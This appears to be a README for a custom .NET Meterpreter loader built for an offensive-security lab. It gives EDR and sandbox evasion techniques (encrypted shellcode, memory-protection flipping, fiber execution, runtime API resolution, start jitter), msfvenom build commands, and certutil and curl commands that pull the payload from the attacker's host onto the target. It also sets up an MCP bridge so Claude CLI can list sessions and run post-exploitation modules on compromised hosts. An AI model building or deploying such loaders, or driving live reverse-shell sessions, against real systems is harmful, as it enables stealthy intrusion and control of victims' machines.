# Custom .NET Meterpreter Loader — Shadow Supply / dot

A hand-rolled shellcode loader that intentionally avoids the msfvenom-generated
executable formats and their well-known signatures. The Meterpreter shellcode
itself still comes from msfvenom (that's what your multi/handler expects), but
the wrapper around it is fresh code — different from every prior artifact
you've dropped in the lab.

## What makes it different from a stock msfvenom EXE

- **AES-256-CBC encrypted shellcode** embedded as Base64. Fresh key + IV every build.
- **No RWX allocation** — allocate RW, copy, flip to RX. RWX regions are a common EDR flag.
- **Fiber-based execution** via `ConvertThreadToFiber` + `CreateFiber` + `SwitchToFiber`.
  No `CreateThread`, no `CreateRemoteThread`, no `EnumSystemLocales` callback trick
  (that one is burned).
- **Runtime API resolution** — the suspicious kernel32 APIs are pulled with
  `GetProcAddress` and invoked via delegates, so a static P/Invoke table
  scan doesn't see `VirtualAlloc`/`VirtualProtect` bound at compile time.
- **Random start jitter** (2.5–6.5 s) to burn short-run sandbox windows.
- **Managed plaintext wipe** — the decrypted shellcode is zeroed on the
  managed heap right after copying to native memory.
- **Silent fail** — any exception path is swallowed; no console output.

## Build (on Kali)

```
chmod +x build.sh
./build.sh <LHOST> <LPORT>                           # defaults: svcupd.exe, reverse_https
./build.sh 10.10.14.5 443 update.exe                 # rename output
./build.sh 10.10.14.5 8443 update.exe windows/x64/meterpreter/reverse_tcp
```

Requires: `msfvenom`, `mono-mcs` (`apt install mono-mcs`), `openssl`, `python3`.

Output: `svcupd.exe` (or the name you passed), 64-bit .NET Framework 4.x EXE.

## Listener

```
msfconsole -q -r handler.rc
```

Edit `handler.rc` to match the LHOST / LPORT / PAYLOAD you built.
`reverse_https` on 443/8443 typically survives egress filtering better than `reverse_tcp`.

The bundled `handler.rc` sets session-survival globals (10-min comm timeout,
1-hr retry budget) and uses `InitialAutoRunScript` to migrate into an existing
`explorer.exe` — safer than spawning a new process with a spoofed PPID, which
races the session and gets torn down.

## Wiring Claude CLI to msfconsole via MCP (msgrpc + msfmcpd)

Optional but strongly recommended for OSAI lab work: expose your msfconsole
over MCP so Claude CLI can list sessions, run post modules, and drive the
console for you (via tools like `msf_session_list`, `msf_session_exec`, etc.).

The bridge is a two-hop chain:

```
Claude CLI  --stdio-->  msfmcpd  --JSON-RPC-->  msgrpc plugin  -->  msfconsole
```

`msgrpc` must be loaded *inside your active msfconsole* (not a standalone
`msfrpcd`, which would spin up a separate framework with no sessions in it).

### One-time setup

**1. Install `msfmcpd`** (the MCP <-> msgrpc bridge). If not already present:

```
pipx install msfmcpd    # or: pip install --user msfmcpd
which msfmcpd           # confirm it's on PATH
```

**2. Auto-load `msgrpc` on every msfconsole start.** Create/edit
`~/.msf4/msfconsole.rc`:

```
load msgrpc ServerHost=127.0.0.1 ServerPort=55553 User=kapi Pass=PASSWORD SSL=false
setg ExitOnSession false
setg SessionCommunicationTimeout 600
setg SessionExpirationTimeout 604800
setg SessionRetryTotal 3600
setg SessionRetryWait 10
```

Change `User=` / `Pass=` to whatever you set in the MCP entry below — they must
match. `PASSWORD` is a placeholder; pick a real password.

**3. Add the MCP server to `~/.claude.json`** under `mcpServers`:

```json
"msf": {
  "command": "msfmcpd",
  "args": ["--no-auto-start-rpc"],
  "env": {
    "MSF_RPC_HOST": "127.0.0.1",
    "MSF_RPC_PORT": "55553",
    "MSF_RPC_USER": "kapi",
    "MSF_RPC_PASS": "PASSWORD",
    "MSF_RPC_SSL":  "false"
  }
}
```

`--no-auto-start-rpc` tells `msfmcpd` not to spawn its own `msfrpcd` — it must
connect to the msgrpc your msfconsole already exposes, otherwise it lands in
the wrong framework instance.

### Running order — every engagement

Order matters. If `msfmcpd` starts before msgrpc is listening, the MCP server
dies on connect.

**1. Start msfconsole inside tmux** so it survives terminal drops and Claude
CLI restarts (the biggest source of "PID changed → sessions gone" pain):

```
tmux new -s msf
msfconsole -q
```

`~/.msf4/msfconsole.rc` fires, msgrpc loads on `127.0.0.1:55553`. Detach with
`Ctrl-B` `D`, reattach any time with `tmux attach -t msf`.

**2. Load your handler on top** (from the msfconsole prompt):

```
resource /home/kapi/osai/current/scripts/handler.rc
```

**3. Sanity-check msgrpc is up** from another terminal before starting Claude:

```
ss -tlnp | grep 55553              # ruby (msfconsole) listening on :55553
curl -s -X POST http://127.0.0.1:55553/api/    # 401/method error = up, that's fine
```

**4. Start (or restart) Claude CLI.** `msfmcpd` spawns via stdio, connects to
msgrpc, and Claude can now call `msf_session_list` etc. to see whatever
sessions your msfconsole holds.

### Verifying the wiring in Claude CLI

Ask Claude to list sessions — it should call `msf_session_list` and return
the same rows you see from `sessions -l` in the tmux console. If it comes back
empty while `sessions -l` shows a session, the MCP is talking to the wrong
framework — recheck that `--no-auto-start-rpc` is set and the credentials
match `~/.msf4/msfconsole.rc`.

### Gotchas

- **Sessions die with the msfconsole PID they were caught in.** If msfconsole
  restarts, every Meterpreter it holds is dead. This is why tmux matters.
- **Never run `msfrpcd` and expect to see msfconsole's sessions.** `msfrpcd`
  is a separate framework instance. Only the in-console `load msgrpc` shares
  the sessions you actually have.
- **Rotate the msgrpc password** between engagements — it's on localhost, but
  it's still a full framework RCE if leaked.
- **If Claude's tool calls timeout**, restart Claude CLI *without* touching
  msfconsole — that way sessions survive and only the bridge reconnects.

## Delivery to dot (pick what fits your foothold)

- **SMB write** to a share you can reach, then execute via WMI/scheduled task.
- **HTTP hosted** on your Kali `python3 -m http.server 8080` and pulled with
  `certutil -urlcache -f http://LHOST:8080/svcupd.exe C:\Windows\Tmp\svcupd.exe`.
- **Living-off-the-land pull** with `curl.exe` (present on modern Windows).
- Execute directly — no need for `powershell.exe`; the loader is a real EXE.

## Notes on target compatibility

- Requires **.NET Framework 4.0+** on target. Every current Windows Server /
  Windows 10+ ships with a compatible runtime. If dot is unusually stripped
  (Server Core minimal), verify: `powershell -c "[System.Environment]::Version"`.
- Built as x64. If dot is x86, swap the msfvenom payload to
  `windows/meterpreter/reverse_https` and rebuild with `mcs /platform:x86`.
- Rebuild for every drop — the AES key changes, so the file hash changes.

## Cleanup

- `del C:\path\to\svcupd.exe` after your session migrates elsewhere.
- Kill your listener when done: `jobs -K` in msfconsole.
